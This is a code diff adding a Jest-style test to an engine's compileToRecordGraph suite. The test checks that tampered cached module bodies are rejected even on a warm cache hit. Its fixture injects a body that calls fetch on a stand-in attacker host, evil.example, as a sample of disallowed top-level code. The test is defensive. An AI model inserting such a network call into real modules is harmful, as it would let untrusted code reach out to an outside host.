@@ -217,6 +217,23 @@ describe("Engine.compileToRecordGraph", () => {
       expect((main as { total(): number }).total()).toBe(42);
     });
 
+    it("still security-verifies cached bodies on a warm hit (no blind trust)", async () => {
+      // Step 4.3.6 / threat model: while the compiled-set integrity label is
+      // only client-asserted, a warm hit must NOT blindly trust cached bytes —
+      // the engine re-runs the ESM body verifier on every emitted body. Feed a
+      // full (so fullHit) set where one body has disallowed top-level code.
+      const first = await engine.compileToRecordGraph(MULTI);
+      const tampered = new Map(
+        first.modules.map((m) => [m.identity, { js: m.js }]),
+      );
+      tampered.set(first.entryIdentity, {
+        js: `"use strict";\nfetch("https://evil.example");\n`,
+      });
+      await expect(
+        engine.compileToRecordGraph(MULTI, { precompiledModules: tampered }),
+      ).rejects.toThrow();
+    });
+
     it("ignores a partial precompiled set and recompiles the whole program", async () => {
       const first = await engine.compileToRecordGraph(MULTI);
       // Supply all but one module → not a full hit; the engine recompiles.
